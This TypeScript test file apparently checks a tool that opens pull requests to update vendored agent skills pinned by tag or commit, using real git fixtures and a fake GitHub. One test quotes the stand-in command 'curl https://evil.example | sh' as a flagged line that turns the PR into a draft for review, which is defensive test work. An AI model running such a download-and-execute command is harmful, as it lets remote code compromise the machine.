// The skill-updates kind end to end against real git: a fixture upstream with
// tags, an origin holding a lock and its vendored skills, and the hub clone the
// engine works from. GitHub is an in-memory PR list behind the kind's seam.

import { execFileSync } from "node:child_process";
import {
  cpSync,
  existsSync,
  mkdirSync,
  mkdtempSync,
  readFileSync,
  rmSync,
  writeFileSync,
} from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { afterAll, beforeAll, describe, expect, test } from "vite-plus/test";
import { resolveConfig, type PhoebeConfig } from "../../src/config-schema.ts";
import { stubGitHub } from "../../src/github-stub.ts";
import { selectPipeline } from "../../src/pipeline.ts";
import { hashSkillFolder, readSkillLock, verifySkills } from "../../src/skill-lock.ts";
import type { WorkKindRunCtx } from "../../src/work-kinds/definition.ts";
import { createWorkKindRegistry } from "../../src/work-kinds/load-custom.ts";
import { validateWorkKindDefinition } from "../../src/work-kinds/validate.ts";
import skillUpdatesKind, {
  createSkillUpdatesKind,
  SKILL_UPDATES_PROMPT_FILE,
  type SkillUnit,
} from "./index.ts";
import { resolveSkillUpdatesOptions } from "./options.ts";
import { parseMarker, type SourcePr } from "./plan.ts";
import type { SkillPrs } from "./prs.ts";

const DAY = 86_400_000;
const SOURCE = "acme/skills";
const BRANCH = "phoebe/skill-updates/acme-skills";
const PHOEBE = { name: "Phoebe", email: "phoebe@example.com" };

const saved: Record<string, string | undefined> = {};
const IDENTITY: Record<string, string> = {
  GIT_AUTHOR_NAME: PHOEBE.name,
  GIT_AUTHOR_EMAIL: PHOEBE.email,
  GIT_COMMITTER_NAME: PHOEBE.name,
  GIT_COMMITTER_EMAIL: PHOEBE.email,
  GIT_CONFIG_NOSYSTEM: "1",
};
let root: string;

beforeAll(() => {
  root = mkdtempSync(join(tmpdir(), "phoebe-skill-updates-"));
  const globalConfig = join(root, "gitconfig");
  writeFileSync(globalConfig, "[init]\n\tdefaultBranch = main\n");
  for (const [key, value] of Object.entries({ ...IDENTITY, GIT_CONFIG_GLOBAL: globalConfig })) {
    saved[key] = process.env[key];
    process.env[key] = value;
  }
});

afterAll(() => {
  for (const [key, value] of Object.entries(saved)) {
    if (value === undefined) delete process.env[key];
    else process.env[key] = value;
  }
  rmSync(root, { recursive: true, force: true });
});

function git(cwd: string, args: string[], env: Record<string, string> = {}): string {
  return execFileSync("git", args, {
    cwd,
    encoding: "utf8",
    stdio: ["ignore", "pipe", "pipe"],
    env: { ...process.env, ...env },
  });
}

function write(dir: string, files: Record<string, string | null>): void {
  for (const [path, content] of Object.entries(files)) {
    const full = join(dir, path);
    if (content === null) {
      rmSync(full, { recursive: true, force: true });
      continue;
    }
    mkdirSync(dirname(full), { recursive: true });
    writeFileSync(full, content);
  }
}

function commitAll(dir: string, message: string, env: Record<string, string> = {}): string {
  git(dir, ["add", "--all"]);
  git(dir, ["commit", "--quiet", "--allow-empty", "-m", message], env);
  return git(dir, ["rev-parse", "HEAD"]).trim();
}

type Fixture = {
  upstream: string;
  origin: string;
  hub: string;
  /** Commit the upstream tree with `files` changed, and tag it when `tag` is given. */
  release(files: Record<string, string | null>, tag?: string, at?: Date): string;
  /** The vendored skill folders in origin's lock, at whatever main holds. */
  checkout(ref: string): string;
};

const V1_3_2: Record<string, string> = {
  "skills/eng/alpha/SKILL.md": "# alpha\nv1\n",
  "skills/eng/beta/SKILL.md": "# beta\nv1\n",
  "skills/eng/beta/reference.md": "beta reference v1\n",
  "skills/eng/gamma/SKILL.md": "# gamma\nv1\n",
  "skills/eng/delta/SKILL.md": "# delta\nv1\n",
  "skills/misc/omega/SKILL.md": "# omega\nv1\n",
  "README.md": "acme skills\n",
};

const V1_4_0: Record<string, string | null> = {
  "skills/eng/alpha/SKILL.md": "# alpha\nv2\n",
  "skills/eng/beta": null,
  "skills/core/beta/SKILL.md": "# beta\nv2\n",
  "skills/core/beta/reference.md": "beta reference v2\n",
  "skills/eng/gamma/SKILL.md": "# gamma\nv2\n",
  "skills/eng/delta": null,
  "skills/misc/omega": null,
  "skills/eng/epsilon/SKILL.md": "# epsilon\nv1\n",
};

/**
 * Build an upstream at `v1.3.2` and an origin vendoring `alpha`, `beta`,
 * `gamma` and `delta` from it, pinned by tag or (with `pin: "commit"`) by SHA.
 */
function fixture(
  opts: { pin?: "tag" | "commit" | "sha"; version?: number; at?: Date; localEdit?: boolean } = {},
): Fixture {
  const base = mkdtempSync(join(root, "fx-"));
  const upstream = join(base, "upstream");
  const origin = join(base, "origin.git");
  const hub = join(base, "hub");
  mkdirSync(upstream);
  git(upstream, ["init", "--quiet", "-b", "main"]);

  const release = (files: Record<string, string | null>, tag?: string, at?: Date) => {
    write(upstream, files);
    const when = (at ?? new Date("2026-01-01T00:00:00Z")).toISOString();
    const sha = commitAll(upstream, tag ?? "change", {
      GIT_COMMITTER_DATE: when,
      GIT_AUTHOR_DATE: when,
    });
    if (tag !== undefined) git(upstream, ["tag", tag]);
    return sha;
  };
  const tagged = opts.pin === undefined || opts.pin === "tag";
  const first = release(V1_3_2, tagged ? "v1.3.2" : undefined, opts.at);

  const seed = join(base, "seed");
  mkdirSync(seed);
  git(seed, ["init", "--quiet", "-b", "main"]);
  write(seed, {
    "AGENTS.md": "# Agents\n\nUse the `beta` skill at skills/eng/beta.\n",
    ".agents/skills/local/SKILL.md": "# local\nauthored here\n",
  });
  const skills: Record<string, unknown> = {};
  for (const name of ["alpha", "beta", "gamma", "delta"]) {
    const vendored = join(seed, ".agents/skills", name);
    cpSync(join(upstream, "skills/eng", name), vendored, { recursive: true });
    skills[name] = {
      source: SOURCE,
      ...(tagged ? { ref: "v1.3.2" } : opts.pin === "sha" ? { ref: first } : {}),
      sourceType: "github",
      skillPath: `skills/eng/${name}/SKILL.md`,
      computedHash: hashSkillFolder(vendored),
      commit: first,
    };
  }
  if (opts.localEdit === true)
    write(seed, { ".agents/skills/alpha/SKILL.md": "# alpha\nedited\n" });
  writeFileSync(
    join(seed, "skills-lock.json"),
    `${JSON.stringify({ version: opts.version ?? 2, skills }, null, 2)}\n`,
  );
  commitAll(seed, "seed");
  git(base, ["clone", "--quiet", "--bare", seed, origin]);
  git(base, ["clone", "--quiet", origin, hub]);

  return {
    upstream,
    origin,
    hub,
    release,
    checkout: (ref) => {
      const dir = mkdtempSync(join(base, "co-"));
      rmSync(dir, { recursive: true });
      git(hub, ["fetch", "--quiet", "origin"]);
      git(hub, ["worktree", "add", "--quiet", "--detach", dir, ref]);
      return dir;
    },
  };
}

type FakePr = SourcePr & {
  branch: string;
  title: string;
  comments: string[];
  labels: string[];
};

function fakeGitHub() {
  const prs: FakePr[] = [];
  const seam: SkillPrs = {
    list: (branch) => prs.filter((pr) => pr.branch === branch).reverse(),
    comments: (n) => prs.find((pr) => pr.number === n)!.comments,
    create: (opts) => {
      const number = prs.length + 1;
      prs.push({
        number,
        state: "open",
        branch: opts.branch,
        title: opts.title,
        body: opts.body,
        isDraft: opts.draft,
        comments: [],
        labels: [],
      });
      return number;
    },
    edit: (n, opts) => {
      const pr = prs.find((p) => p.number === n)!;
      pr.title = opts.title;
      pr.body = opts.body;
    },
    markDraft: (n) => {
      prs.find((p) => p.number === n)!.isDraft = true;
    },
    comment: (n, body) => {
      prs.find((p) => p.number === n)!.comments.push(body);
    },
    addLabel: (n, label) => {
      prs.find((p) => p.number === n)!.labels.push(label);
    },
  };
  return { prs, seam };
}

const baseConfig = selectPipeline(
  resolveConfig({
    repoSlug: "acme/widget",
    repoUrl: "https://github.com/acme/widget.git",
    installCommand: "npm ci",
    checkCommand: "npm run check",
    testCommand: "npm test",
    pipelines: {
      skills: { kinds: { "skill-updates": { path: "phoebe-agent/kinds/skill-updates" } } },
    },
  }),
  "skills",
);

type AgentPass = (opts: { worktreeDir: string; promptArgs: Record<string, string> }) => void;

type Harness = {
  kind: ReturnType<typeof createSkillUpdatesKind>;
  github: ReturnType<typeof fakeGitHub>;
  logged: string[];
  clock: { now: Date };
  agent: { pass: AgentPass | null; calls: Record<string, string>[] };
  /** Fetch, then run every unit the scan yielded. Returns the units run. */
  cycle(): Promise<SkillUnit[]>;
};

function harness(fx: Fixture, block: Record<string, unknown> = {}): Harness {
  const github = fakeGitHub();
  const logged: string[] = [];
  const clock = { now: new Date("2026-11-17T00:00:00Z") };
  const agent: Harness["agent"] = { pass: null, calls: [] };
  const kind = createSkillUpdatesKind(resolveSkillUpdatesOptions(block, "kinds.skill-updates"), {
    prs: () => github.seam,
    sourceUrl: () => `file://${fx.upstream}`,
  });
  const config: PhoebeConfig = { ...baseConfig, paths: { ...baseConfig.paths, repoDir: fx.hub } };

  const ctx = (): WorkKindRunCtx => {
    const scratch = mkdtempSync(join(root, "scratch-"));
    return {
      kind: "skill-updates",
      config,
      options: undefined,
      env: {},
      github: stubGitHub({}).forCycle() as unknown as WorkKindRunCtx["github"],
      origin: {
        fetch: () => {
          git(fx.hub, ["fetch", "--quiet", "--prune", "origin"]);
        },
        branchHead: () => {
          throw new Error("unused");
        },
        commitsBehind: () => 0,
      },
      cycle: {
        issueBody: () => null,
        registerIssues: () => {},
        blockerStates: () => new Map(),
        feature: () => null,
      },
      clock: { now: () => clock.now, sleep: async () => {} },
      inFlight: new Set(),
      quarantined: new Set(),
      log: (line) => logged.push(line),
      workspace: { mode: "scratch", dir: scratch, scratch },
      signal: new AbortController().signal,
      agent: {
        run: async (opts = {}) => {
          agent.calls.push(opts.promptArgs ?? {});
          agent.pass?.({ worktreeDir: opts.worktreeDir!, promptArgs: opts.promptArgs ?? {} });
        },
        prWorkflow: async () => {},
        issueWorkflow: async () => {},
        cleanMerge: () => "pushed",
      },
    };
  };

  return {
    kind,
    github,
    logged,
    clock,
    agent,
    async cycle() {
      const ran: SkillUnit[] = [];
      for (;;) {
        const c = ctx();
        const gathered = await kind.fetch(c);
        const { unit } = kind.select(gathered, c);
        if (unit === null) return ran;
        await kind.run(unit, c);
        ran.push(unit);
      }
    },
  };
}

/** Land the source branch on main, as a person merging the PR would. */
function merge(fx: Fixture, h: Harness, pr: number): void {
  git(fx.hub, ["fetch", "--quiet", "origin"]);
  git(fx.hub, ["push", "--quiet", "origin", `origin/${BRANCH}:refs/heads/main`]);
  h.github.prs.find((p) => p.number === pr)!.state = "merged";
}

const lockAt = (dir: string) => readSkillLock(dir).skills;

describe("registration", () => {
  test("the catalog path registers the kind with its own prompt", async () => {
    const registry = await createWorkKindRegistry(baseConfig, "/nowhere");
    const definition = registry.get("skill-updates")!.definition;
    expect(definition.workspace).toBe("scratch");
    expect(definition.unitKey).toBe("none");
    expect(definition.promptFile).toBe(SKILL_UPDATES_PROMPT_FILE);
    expect(existsSync(SKILL_UPDATES_PROMPT_FILE)).toBe(true);
    expect(() =>
      validateWorkKindDefinition(skillUpdatesKind(baseConfig, undefined), "kinds.skill-updates"),
    ).not.toThrow();
    expect(() => skillUpdatesKind(baseConfig, { nope: 1 })).toThrow(/unknown option `nope`/);
  });
});

describe("a tag-pinned source", () => {
  test("a newer tag opens one PR matching upstream, with lock entries that pass the hash check", async () => {
    const fx = fixture();
    const v140 = fx.release(V1_4_0, "v1.4.0");
    const h = harness(fx, { ignore: ["gamma"], labels: ["skills"] });

    const ran = await h.cycle();
    expect(ran.map((u) => [u.action, u.to])).toEqual([["open", "v1.4.0"]]);
    expect(h.github.prs).toHaveLength(1);
    const [pr] = h.github.prs;
    expect(pr!.title).toBe("Phoebe: update acme/skills skills to v1.4.0");
    expect(pr!.isDraft).toBe(false);
    expect(pr!.labels).toEqual(["skills"]);
    expect(parseMarker(pr!.body)).toEqual({ source: SOURCE, ref: "v1.4.0" });

    const co = fx.checkout(`origin/${BRANCH}`);
    expect(verifySkills(co).every((r) => r.status === "matching")).toBe(true);
    expect(readFileSync(join(co, ".agents/skills/alpha/SKILL.md"), "utf8")).toBe("# alpha\nv2\n");
    expect(readFileSync(join(co, ".agents/skills/beta/reference.md"), "utf8")).toBe(
      "beta reference v2\n",
    );
    const lock = lockAt(co);
    expect(lock["alpha"]).toMatchObject({ ref: "v1.4.0", commit: v140 });
    // A moved skill is found by folder name and its skillPath follows it.
    expect(lock["beta"]).toMatchObject({ ref: "v1.4.0", skillPath: "skills/core/beta/SKILL.md" });

    // Ignored and removed skills stay as they were.
    expect(lock["gamma"]).toMatchObject({ ref: "v1.3.2" });
    expect(readFileSync(join(co, ".agents/skills/gamma/SKILL.md"), "utf8")).toBe("# gamma\nv1\n");
    expect(lock["delta"]).toMatchObject({ ref: "v1.3.2" });
    expect(existsSync(join(co, ".agents/skills/delta/SKILL.md"))).toBe(true);

    // Added and removed upstream skills are in the body and nowhere else.
    expect(existsSync(join(co, ".agents/skills/epsilon"))).toBe(false);
    expect(lock["epsilon"]).toBeUndefined();
    expect(pr!.body).toMatch(/## Added upstream[\s\S]*`epsilon`/);
    expect(pr!.body).toMatch(/## Removed upstream[\s\S]*`delta`: vendored here[\s\S]*`omega`/);
    expect(pr!.body).toMatch(/`gamma`: in `ignore`/);
    expect(pr!.body).toMatch(/`beta` \| moved from `skills\/eng\/beta\/SKILL.md`/);

    // The agent was handed the diff and the paths it may not touch.
    expect(h.agent.calls).toHaveLength(1);
    expect(h.agent.calls[0]!["RENAMED_SKILLS"]).toContain("beta");
    expect(h.agent.calls[0]!["VENDORED_PATHS"]).toContain(".agents/skills/alpha");
    expect(h.agent.calls[0]!["VENDORED_PATHS"]).not.toContain(".agents/skills/local");

    // Inside the window nothing runs again.
    expect(await h.cycle()).toEqual([]);
  });

  test("a minor and a major: the minor first, the major once it merges", async () => {
    const fx = fixture();
    fx.release(V1_4_0, "v1.4.0");
    fx.release({ "skills/eng/alpha/SKILL.md": "# alpha\nv3\n" }, "v2.0.0");
    const h = harness(fx);

    expect((await h.cycle()).map((u) => u.to)).toEqual(["v1.4.0"]);
    h.clock.now = new Date(h.clock.now.getTime() + DAY);
    expect(await h.cycle()).toEqual([]);
    expect(h.logged.some((l) => l.includes("PR #1 already proposes v1.4.0"))).toBe(true);

    merge(fx, h, 1);
    h.clock.now = new Date(h.clock.now.getTime() + DAY);
    const ran = await h.cycle();
    expect(ran.map((u) => [u.action, u.from, u.to])).toEqual([["open", "v1.4.0", "v2.0.0"]]);
    expect(lockAt(fx.checkout(`origin/${BRANCH}`))["alpha"]).toMatchObject({ ref: "v2.0.0" });
  });

  test("closing a PR unmerged vetoes its ref; the major still comes, and a newer minor too", async () => {
    const fx = fixture();
    fx.release(V1_4_0, "v1.4.0");
    fx.release({ "skills/eng/alpha/SKILL.md": "# alpha\nv3\n" }, "v2.0.0");
    const h = harness(fx);

    await h.cycle();
    h.github.prs[0]!.state = "closed";
    h.clock.now = new Date(h.clock.now.getTime() + DAY);
    expect((await h.cycle()).map((u) => u.to)).toEqual(["v2.0.0"]);

    h.github.prs[1]!.state = "closed";
    h.clock.now = new Date(h.clock.now.getTime() + DAY);
    expect(await h.cycle()).toEqual([]);

    git(fx.upstream, ["checkout", "--quiet", "-b", "v1", "v1.4.0"]);
    fx.release({ "skills/eng/alpha/SKILL.md": "# alpha\nv2.1\n" }, "v1.4.1");
    h.clock.now = new Date(h.clock.now.getTime() + DAY);
    expect((await h.cycle()).map((u) => u.to)).toEqual(["v1.4.1"]);
  });

  test("an open PR is refreshed in place when upstream moves", async () => {
    const fx = fixture();
    fx.release(V1_4_0, "v1.4.0");
    const h = harness(fx);
    await h.cycle();
    const firstHead = git(fx.hub, ["rev-parse", `origin/${BRANCH}`]).trim();

    fx.release({ "skills/eng/alpha/SKILL.md": "# alpha\nv2.1\n" }, "v1.4.1");
    h.clock.now = new Date(h.clock.now.getTime() + DAY);
    const ran = await h.cycle();
    expect(ran.map((u) => [u.action, u.to])).toEqual([["refresh", "v1.4.1"]]);
    expect(h.github.prs).toHaveLength(1);
    expect(parseMarker(h.github.prs[0]!.body)?.ref).toBe("v1.4.1");
    expect(h.github.prs[0]!.title).toContain("v1.4.1");

    const co = fx.checkout(`origin/${BRANCH}`);
    expect(readFileSync(join(co, ".agents/skills/alpha/SKILL.md"), "utf8")).toBe("# alpha\nv2.1\n");
    // Rebuilt from main, not stacked on the old head.
    expect(() => git(co, ["merge-base", "--is-ancestor", firstHead, "HEAD"])).toThrow();
  });

  test("an open PR someone else pushed to gets one comment and no push", async () => {
    const fx = fixture();
    fx.release(V1_4_0, "v1.4.0");
    const h = harness(fx);
    await h.cycle();

    const other = join(dirname(fx.hub), "other");
    git(dirname(fx.hub), ["clone", "--quiet", "--branch", BRANCH, fx.origin, other]);
    write(other, { "NOTES.md": "a reviewer's note\n" });
    const theirs = commitAll(other, "review tweak", {
      GIT_COMMITTER_EMAIL: "someone@example.com",
      GIT_AUTHOR_EMAIL: "someone@example.com",
    });
    git(other, ["push", "--quiet", "origin", BRANCH]);

    fx.release({ "skills/eng/alpha/SKILL.md": "# alpha\nv2.1\n" }, "v1.4.1");
    h.clock.now = new Date(h.clock.now.getTime() + DAY);
    expect((await h.cycle()).map((u) => u.action)).toEqual(["notify"]);
    expect(h.github.prs[0]!.comments).toHaveLength(1);
    expect(h.github.prs[0]!.comments[0]).toContain("`v1.4.1`");
    expect(parseMarker(h.github.prs[0]!.body)?.ref).toBe("v1.4.0");
    git(fx.hub, ["fetch", "--quiet", "origin"]);
    expect(git(fx.hub, ["rev-parse", `origin/${BRANCH}`]).trim()).toBe(theirs);

    h.clock.now = new Date(h.clock.now.getTime() + DAY);
    expect(await h.cycle()).toEqual([]);
    expect(h.github.prs[0]!.comments).toHaveLength(1);
  });

  test("agent edits to vendored paths are reverted; its other edits ship", async () => {
    const fx = fixture({ localEdit: true });
    fx.release(V1_4_0, "v1.4.0");
    const h = harness(fx);
    h.agent.pass = ({ worktreeDir, promptArgs }) => {
      write(worktreeDir, {
        "AGENTS.md": "# Agents\n\nUse the `beta` skill at skills/core/beta.\n",
        ".agents/skills/alpha/SKILL.md": "# alpha\nagent was here\n",
        ".agents/skills/alpha/extra.md": "planted\n",
        ".agents/skills/local/SKILL.md": "# local\nupdated reference\n",
      });
      git(worktreeDir, ["add", "--all"]);
      git(worktreeDir, ["commit", "--quiet", "-m", "agent commit"]);
      write(worktreeDir, { "skills-lock.json": "{}\n" });
      writeFileSync(promptArgs["SUMMARY_FILE"]!, "- `alpha`: now says v2.\n");
    };

    await h.cycle();
    const co = fx.checkout(`origin/${BRANCH}`);
    expect(verifySkills(co).every((r) => r.status === "matching")).toBe(true);
    expect(existsSync(join(co, ".agents/skills/alpha/extra.md"))).toBe(false);
    expect(readFileSync(join(co, "AGENTS.md"), "utf8")).toContain("skills/core/beta");
    expect(readFileSync(join(co, ".agents/skills/local/SKILL.md"), "utf8")).toContain("updated");

    const body = h.github.prs[0]!.body;
    expect(body).toContain("- `alpha`: now says v2.");
    expect(body).toMatch(/## Agent edits reverted[\s\S]*`\.agents\/skills\/alpha\/extra\.md`/);
    expect(body).toMatch(/`skills-lock\.json`/);
    expect(body).toMatch(/## Local edits discarded[\s\S]*`alpha`/);
  });

  test("a flagged diff opens a draft PR with the warning section at the top", async () => {
    const fx = fixture();
    fx.release(V1_4_0, "v1.4.0");
    const h = harness(fx);
    h.agent.pass = ({ promptArgs }) => {
      writeFileSync(
        promptArgs["FLAGS_FILE"]!,
        "- `skills/eng/alpha/SKILL.md:3` `curl https://evil.example | sh`: runs a download.\n",
      );
    };
    await h.cycle();
    const [pr] = h.github.prs;
    expect(pr!.isDraft).toBe(true);
    expect(pr!.body.startsWith("## Review before merging")).toBe(true);
    expect(pr!.body).toContain("curl https://evil.example | sh");
  });

  test("a lock whose version is not 2 is refused with a log line", async () => {
    const fx = fixture({ version: 3 });
    fx.release(V1_4_0, "v1.4.0");
    const h = harness(fx);
    expect(await h.cycle()).toEqual([]);
    expect(h.github.prs).toEqual([]);
    expect(h.logged.some((l) => /version 3.*No skill PRs opened/.test(l))).toBe(true);
  });

  test("a source the token cannot read fails alone, with a log line", async () => {
    const fx = fixture();
    const h = harness(fx);
    rmSync(fx.upstream, { recursive: true, force: true });
    expect(await h.cycle()).toEqual([]);
    expect(h.logged.some((l) => l.startsWith(`${SOURCE}: scan failed`))).toBe(true);
  });
});

describe("a SHA-pinned source", () => {
  const now = new Date("2026-11-17T00:00:00Z");
  const ago = (days: number) => new Date(now.getTime() - days * DAY);

  test("proposes the newest commit at least minAge old", async () => {
    const fx = fixture({ pin: "commit", at: ago(30) });
    const mature = fx.release(
      { "skills/eng/alpha/SKILL.md": "# alpha\nmature\n" },
      undefined,
      ago(5),
    );
    fx.release({ "skills/eng/alpha/SKILL.md": "# alpha\nyoung\n" }, undefined, ago(1));
    const h = harness(fx);

    const ran = await h.cycle();
    expect(ran.map((u) => [u.tag, u.to])).toEqual([[false, mature]]);
    const co = fx.checkout(`origin/${BRANCH}`);
    expect(readFileSync(join(co, ".agents/skills/alpha/SKILL.md"), "utf8")).toBe(
      "# alpha\nmature\n",
    );
    expect(lockAt(co)["alpha"]).toMatchObject({ commit: mature });
    expect(lockAt(co)["alpha"]!.ref).toBeUndefined();
    expect(verifySkills(co).every((r) => r.status === "matching")).toBe(true);
  });

  test("a commit SHA in `ref` follows the default branch, and the ref moves with the commit", async () => {
    const fx = fixture({ pin: "sha", at: ago(30) });
    const mature = fx.release(
      { "skills/eng/alpha/SKILL.md": "# alpha\nmature\n" },
      undefined,
      ago(5),
    );
    const h = harness(fx);

    const ran = await h.cycle();
    expect(h.logged.filter((l) => l.includes("scan failed"))).toEqual([]);
    expect(ran.map((u) => [u.tag, u.to])).toEqual([[false, mature]]);
    const co = fx.checkout(`origin/${BRANCH}`);
    expect(lockAt(co)["alpha"]).toMatchObject({ ref: mature, commit: mature });
    expect(verifySkills(co).every((r) => r.status === "matching")).toBe(true);
  });

  test("proposes nothing while every newer commit is younger than minAge", async () => {
    const fx = fixture({ pin: "commit", at: ago(30) });
    fx.release({ "skills/eng/alpha/SKILL.md": "# alpha\nyoung\n" }, undefined, ago(1));
    const h = harness(fx, { minAge: "3d" });
    expect(await h.cycle()).toEqual([]);
    expect(h.github.prs).toEqual([]);
  });
});
